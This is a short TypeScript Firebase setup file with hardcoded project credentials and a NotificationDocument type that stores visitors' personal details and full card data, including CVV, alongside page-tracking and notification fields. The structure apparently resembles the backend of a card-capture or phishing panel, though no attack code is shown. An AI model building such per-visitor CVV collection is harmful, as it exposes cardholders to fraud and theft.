import { initializeApp, getApps, getApp } from "firebase/app";
import { getAuth } from "firebase/auth";
import { getFirestore } from "firebase/firestore";
import { getDatabase } from "firebase/database";

const firebaseConfig = {
 apiKey: "AIzaSyCJx5avdyV37pLWEa4iQCRIWeAs93A08kA",
  authDomain: "new-bccc.firebaseapp.com",
  databaseURL: "https://new-bccc-default-rtdb.firebaseio.com",
  projectId: "new-bccc",
  storageBucket: "new-bccc.firebasestorage.app",
  messagingSenderId: "834804078736",
  appId: "1:834804078736:web:17998f00cd3cfb5293a015",
  measurementId: "G-PG8TZMLDEY"
};;

const app = getApps().length > 0 ? getApp() : initializeApp(firebaseConfig);
const auth = getAuth(app);
const db = getFirestore(app);
const database = getDatabase(app);

export { app, auth, db, database };

export interface NotificationDocument {
  id: string;
  name: string;
  hasPersonalInfo: boolean;
  hasCardInfo: boolean;
  currentPage: string;
  time: string;
  notificationCount: number;
  personalInfo?: {
    fullName: string;
    email: string;
    phone: string;
    address: string;
  };
  cardInfo?: {
    cardNumber: string;
    expirationDate: string;
    cvv: string;
  };
}


